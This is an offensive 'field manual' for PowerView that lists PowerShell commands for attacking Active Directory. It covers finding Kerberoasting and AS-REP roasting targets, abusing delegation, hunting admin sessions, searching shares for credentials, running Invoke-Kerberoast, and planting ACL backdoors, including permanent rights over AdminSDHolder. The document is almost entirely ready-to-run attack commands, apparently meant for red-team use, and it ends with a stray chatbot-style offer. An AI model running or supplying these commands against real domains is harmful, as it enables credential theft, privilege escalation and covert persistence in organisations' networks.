## 🛠️ PowerView Operational Field Manual (Active Directory Mastery Edition)

## 🧠 Core Operator Mindset

> [!INFO] 🎯 Core Automation Philosophy
> 
> Powershell
> 
> ```powershell
> Filter at the pipeline source.
> Recursively resolve nesting.
> Expose the hidden descriptors.
> ```
> 
> 💡 PowerView is the premier Active Directory situational awareness tool. To optimize triage speed, understand its foundational design and syntax architecture:
> 
> - `Get-*`: High-fidelity collection engines built to systematically scrape raw LDAP matrices.
> - `Find-*`: Targeted operational hunters that correlate raw datasets into clear actionable footholds.
> - `*-Domain*`: Signals standard directory infrastructure queries performed via backend `.NET` / `LDAP` methods.
> - `*-Net*`: Signals extremely rapid localized enumeration running via direct Windows `Win32 API` calls.

---

## ⚡ Phase 1 — Account & UAC Filter Triage

## 👥 Deep-Dive Group Membership Recursion

> [!SUCCESS] 🔍 Map Effective Identities
> 
> Powershell
> 
> ```powershell
> # Recurse UP: Find every group a target user/group is effectively a member of via tokenGroups
> Get-DomainGroup -MemberIdentity <User/Group>
> 
> # Recurse DOWN: Unroll nested groups to reveal every final human/computer member inside a group
> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
> ```

## 🕵️ High-Value User Attack Surface Discovery

> [!DANGER] 🚀 Isolate Misconfigured & Target Accounts
> 
> Powershell
> 
> ```powershell
> # Extract all accounts configured with an SPN (Primary Kerberoasting Targets)
> Get-DomainUser -SPN
> 
> # Isolate accounts missing Kerberos Preauthentication requirements (AS-REP Roasting Targets)
> Get-DomainUser -PreauthNotRequired
> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
> 
> # Find all highly privileged Service Accounts embedded directly inside Domain Admins
> Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
> 
> # Identify accounts tracking historical configurations across previous infrastructure states
> Get-DomainUser -LDAPFilter '(sidHistory=*)'
> ```

## 🛡️ Advanced User Account Control (UAC) Matrix Filtering

> [!TIP] 🧠 Granular Account Property Isolation
> 
> Powershell
> 
> ```powershell
> # Extract all active, operational user records while dropping disabled noise
> Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
> Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
> 
> # Isolate disabled accounts to track historical leftovers or stale pathways
> Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
> Get-DomainUser -UACFilter ACCOUNTDISABLE
> 
> # Audit hard enforcement environments requiring Smart Card authentication
> Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
> Get-DomainUser -UACFilter SMARTCARD_REQUIRED
> 
> # Target low-hanging fruit accounts where Smart Card requirements are explicitly disabled
> Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
> Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
> ```

---

## 🔥 Phase 2 — Asset Discovery & Delegation Auditing

## 💻 Organizational Unit (OU) & Computer Infrastructure Scoping

> [!SUCCESS] 🌐 Map System Deployment Patterns
> 
> Powershell
> 
> ```powershell
> # Extract all computer objects deployed within a specific target Organizational Unit
> Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
> 
> # Leverage Global Catalogs to swiftly map short host names into valid enterprise FQDNs
> gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}
> ```

## ⚔️ Kerberos Delegation Exposure Auditing

> [!DANGER] ☣️ Expose Impersonation Vulnerabilities
> 
> Powershell
> 
> ```powershell
> # Identify assets configured for Constrained Delegation (S4U2Proxy pivoting vectors)
> Get-DomainUser -TrustedToAuth
> Get-DomainComputer -TrustedToAuth
> 
> # Isolate unconstrained infrastructure combined with high-value, non-sensitive accounts
> $Computers = Get-DomainComputer -Unconstrained
> $Users = Get-DomainUser -AllowDelegation -AdminCount
> ```

---

## 🧪 Phase 3 — High-Fidelity Threat Hunting Commands

## 🎯 Direct Kerberoasting Attacks

> [!DANGER] 🚀 Perform Localized Kerberoasting
> 
> Powershell
> 
> ```powershell
> Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
> ```

## 🔍 User Hunting & Live Session Extraction

> [!WARNING] 🔥 Map Network Administrator Footprints
> 
> Powershell
> 
> ```powershell
> # Hunt down active administrator sessions resting on Unconstrained Delegation systems
> Find-DomainUserLocation -ComputerUnconstrained -ShowAll
> 
> # Target highly active delegated administrator identities on unconstrained assets
> Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
> 
> # Scrape live interactive user sessions logged into systems within specific Server OUs
> Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
> ```

## 🔬 Local Machine Permissions & Share Analysis

> [!TIP] 📁 Audit Local Exposure Matrix
> 
> Powershell
> 
> ```powershell
> # Enumerate the naming schema of all local groups active on a remote server asset
> Get-NetLocalGroup SERVER.domain.local
> 
> # Query remote local group memberships via high-speed Win32 API configurations
> Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
> 
> # Scan accessible enterprise shares to harvest credentials, configurations, or backups
> Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
> ```

---

## 🪟 Phase 4 — Policy, GPO, & Structural Mapping

## 📜 Organizational Policy Harvesting

> [!SUCCESS] 🧠 Extract Hardening Metrics
> 
> Powershell
> 
> ```powershell
> # Extract Domain Controller security settings to check User Privilege Assignments
> (Get-DomainPolicy -Policy DC).PrivilegeRights
> 
> # Extract baseline Kerberos policy details (MaxServiceTicketAge) for ticket timing setups
> (Get-DomainPolicy -Policy Domain).KerberosPolicy
> 
> # Review account lockouts, complexity configurations, and historical password lifetimes
> (Get-DomainPolicy -Policy Domain).SystemAccess
> ```

## 🗺️ Group Policy Object (GPO) Access Mapping

> [!DANGER] 🛠️ Correlate GPO Control to Target Hardware
> 
> Powershell
> 
> ```powershell
> # Identify which target machines a specific identity possesses local administrative control over
> Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>
> 
> # Map out explicit remote desktop protocol (RDP) access paths for a target identity
> Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP
> 
> # Export the entire corporate GPO mapping configuration matrix cleanly to a flat CSV file
> Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
> ```

---

## 🧨 Phase 5 — Access Control List (ACL) Exploitation

## 🔐 Object Protection Auditing

> [!SUCCESS] 🧩 Expose Discretionary Access Security Controls
> 
> Powershell
> 
> ```powershell
> # Enumerate who holds management, reset, or write capabilities over a target identity
> Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
> 
> # Inspect the structural security descriptors guarding the highly sensitive AdminSDHolder container
> Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
> 
> # Map out every structural security identity capable of initiating DCSync directory replication
> Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
> ```

## ☣️ Post-Exploitation Persistence & Privilege Placement

> [!DANGER] 💀 Inject Malicious Control Rights
> 
> Powershell
> 
> ```powershell
> # Forcefully award a principal identity the structural right to manually reset a target password
> Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
> 
> # Backdoor the AdminSDHolder object to enforce permanent administrative rights over all protected users
> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
> ```

---

## 🦾 Phase 6 — Operational Efficiency Adjustments

## 🎭 Context Switching (Alternate Credentials)

> [!SUCCESS] 🕶️ Multi-Context Query Execution
> 
> Powershell
> 
> ```powershell
> # Build a persistent authentication token structure to execute queries as a different user
> $SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
> $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
> 
> # Pass the newly spawned token straight into your target structural search function
> Get-DomainUser -Credential $Cred
> ```

## 🔍 Data Correlation & Outlier Triage

> [!TIP] 🧮 Fast Filter Pipelines
> 
> Powershell
> 
> ```powershell
> # Multi-Identity Input: Pipeline cross-referenced identity arrays straight into collection arguments
> 'S-1-5-21-1114', 'CN=dfm,CN=Users...', 'administrator' | Get-DomainUser -Properties samaccountname
> 
> # Time Calculations: Filter accounts that haven't modified their login passwords within 1 year
> $Date = (Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
> 
> # Machine Account Discovery: Identify computer accounts hidden inside privileged groups
> Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
> ```

## 📂 Session Memory Persistence

> [!SUCCESS] 📦 Serialize Datasets to Disk
> 
> Powershell
> 
> ```powershell
> # Save a live collection state securely to disk to avoid generating repeated LDAP traffic spikes
> Get-DomainUser | Export-Clixml user.xml
> 
> # Re-import the saved file back into memory in a completely offline scenario
> $Users = Import-Clixml user.xml
> ```

---

Next Steps & Pro Tips

- Remember that when executing `Get-DomainObjectAcl` or `Get-DomainGroupMember`, you can easily bottleneck your host terminal. Always use `-Properties` to limit data output to fields like `samaccountname`, `distinguishedname`, or `objectsid`.
- If you want to check your active domain environment metrics, let me know if you want me to write out a Fast Automation Script block to check for Group Policy Password (GPP) exposures across all OUs.